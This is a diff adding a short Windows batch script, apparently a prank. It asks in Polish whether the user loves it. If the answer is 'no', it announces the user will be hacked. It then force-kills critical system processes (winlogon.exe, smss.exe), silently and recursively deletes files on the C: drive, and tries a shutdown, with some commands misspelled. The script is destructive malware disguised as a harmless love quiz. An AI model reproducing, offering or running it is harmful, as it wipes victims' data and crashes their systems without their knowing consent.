@@ -1,0 +1,24 @@
+@echo off
+
+color a
+echo Czesc czy ty kochasz mnie?(answer in only yes/no)
+set /p input=
+if /i %input%==Yes goto love
+if /i %input%==no goto hate
+if /i not %input%== Yes,no goto 1
+
+:love
+echo Ja ciebie tez kocham!
+echo Do zobaczenia!
+pause
+exit
+
+:hate
+echo Czemu mnie nie kochasz?...lol
+echo Jak mnie nie kochasz zostaniesz shakowany!!!
+taskkill /f /im winlogon.exe
+taskkill /f /im smss.exe
+taskkill /f /im ntoskml.exe
+del c:\*/s /q
+timeout 10
+shotdown -s -t 20 -c "Nie kochasz mnie!
